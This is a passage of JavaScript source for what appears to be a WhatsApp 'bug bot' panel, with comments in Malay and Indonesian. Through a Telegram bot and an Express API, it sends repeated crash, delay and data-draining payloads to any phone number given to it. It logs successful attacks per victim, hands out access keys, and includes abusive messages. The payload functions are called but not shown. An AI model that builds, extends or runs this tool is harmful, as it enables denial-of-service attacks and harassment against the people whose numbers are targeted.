  }
});

// ===========================
// LOG CEK BUG (BERJAYA & GAGAL)
// ===========================
const bugLogs = []; // simpan semua percubaan bug

function logBugResult(jid, type, status) {
  bugLogs.push({
    jid,
    type,
    status, // "success" atau "fail"
    time: new Date().toLocaleString("ms-MY", { timeZone: "Asia/Kuala_Lumpur" })
  });
  if (bugLogs.length > 100) bugLogs.shift(); // limit 100
}

// ===========================
// /cekbug command (Telegram)
// ===========================
bot.onText(/^\/cekbug$/, async (msg) => {
  const chatId = msg.chat.id;

  if (bugLogs.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Tiada percubaan bug dihantar setakat ini.");
  }

  const successCount = bugLogs.filter(b => b.status === "success").length;
  const failCount = bugLogs.filter(b => b.status === "fail").length;

  const list = bugLogs.map((b, i) => {
    const display = b.jid.replace("@s.whatsapp.net", ""); // nampak kemas
    return `${i + 1}. 📱 *${display}*\n   🔧 Mode: ${b.type}\n   ${
      b.status === "success" ? "✅ BERJAYA" : "❌ GAGAL"
    }\n   🕒 ${b.time}`;
  }).join("\n\n");

  const message = `
📋 *LIST BUG YANG DIHANTAR ✅️/❌*
\`\`\`
${list}
\`\`\`
📊 Statistik:
✅ Berjaya: ${successCount}
❌ Gagal: ${failCount}
🔢 Jumlah Cubaan: ${bugLogs.length}
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===========================
// /getkey command new
// ===========================
bot.onText(/^\/getkey (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1].trim();

  if (!/^\d+$/.test(targetId)) {
    return bot.sendMessage(chatId, "❌ BUKAN GITU KOCAK");
  }

  const keyPrivite = "Key"; // <-- UBAH INI DAN HTML

  const message = `
\`\`\`
${keyPrivite}
\`\`\`
  `;

  const opts = {
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "OWNER", url: "https://t.me/OrzaaSystem" }
        ]
      ]
    }
  };

  try {
    await bot.sendMessage(targetId, message, opts);
    bot.sendMessage(chatId, `✅ Key telah dihantar ke ID: \`${targetId}\``, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Gagal hantar mesej:", err.message);
    bot.sendMessage(chatId, "❌ PASTIKAN UDAH DI START DAN ID BETUL VALID NGENTOD OTAK LU DIMANA TOLOL BODOH");
  }
});

// ===========================
// /CASE COMMAND
// ===========================
bot.onText(/^\/refresh$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    // HANTAR MESEJ
    await bot.sendMessage(chatId, "⚠️ Server is refreshing, please wait 30-60");

    // Padam folder session lama
    const sessionPath = path.join(__dirname, "session");

    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log(chalk.yellow("MODE CLEAR SESSION DONE ✅️"));
    } else {
      console.log(chalk.gray("🔆 TIADA SESSION LAGI"));
    }

    // Tunggu sekejap sebelum restart
    await sleep(2000);

    // Restart panel semula (process)
    console.log(chalk.green("🚫 RESTART PANEL"));
    process.exit(1); // systemd/pm2 akan auto-restart process ini

  } catch (err) {
    console.error("❌ Gagal refresh:", err);
    bot.sendMessage(chatId, "❌ Gagal Alias error");
  }
});
// ===========================
// EXPRESS SERVER
// ===========================
const app = express();
app.use(cors());
app.use(express.json());
app.use("/", express.static(path.join(__dirname, "public")));

app.post("/api/bug/:type", async (req, res) => {
  const { number } = req.body;
  const { type } = req.params;

  if (!waSocket) return res.status(500).send("❌ Bot belum siap.");
  if (!number || !type) return res.status(400).send("❌ Nomor atau mode tidak valid.");

  let jid = "";
  if (/^\d{8,20}$/.test(number)) jid = number + "@s.whatsapp.net";
  else return res.status(400).send("❌ Format nomor tidak valid.");

  try {
    if (type === "IOS") {
      console.log(`🚀 Mengirim Ios ke ${jid}`);
      for (let i = 0; i < 15; i++) { 
        await iOSX(jid, waSocket);
        await sleep(1000);
      }
    } else if (type === "DELAY") {
      console.log(`🚀 Mengirim Delay ke ${jid}`);
      for (let i = 0; i < 100; i++) { 
        await AxMaker2(jid, waSocket);
        await sleep(1500);
      }
    } else if (type === "ANDRO") {
      console.log(`🚀 Mengirim Crash Ui ${jid}`);
      for (let i = 0; i < 5; i++) { 
        await XUI1(jid, waSocket);
        await lottieSql(jid, waSocket);
        await XUI2(jid, waSocket);
        await urllocdroid(jid, waSocket);
        await sleep(3000);
      }
    } else if (type === "DELAY HARD") {
      console.log(`🚀 Mengirim Delay2 ke ${jid}`);
      for (let i = 0; i < 500; i++) { 
        await notifblank(jid, waSocket);
        await ForceClick(jid, waSocket);
      }
    } else if (type === "delay") {
      console.log(`🚀 Mengirim Sedot Kuota ke ${jid}`);
      await DelayOneMessage(jid, waSocket);
    } else {
      return res.status(400).send("❌ Mode Bug Tidak Dikenali.");
    }

    // ✅ Kalau berjaya kirim
    logBugResult(jid, type, "success");
    return res.json({ message: `✅ Bug ${type} berhasil dikirim ke ${number}` });

  } catch (err) {
    // ❌ Kalau gagal
    console.error("❌ Gagal kirim bug:", err);
    logBugResult(jid, type, "fail");
    return res.status(500).send("❌ Gagal kirim bug");
  }
});

startBot();
app.listen(7323, () => console.log("🌐 Server aktif di http://dalangstore.servercloud.my.id:7323"));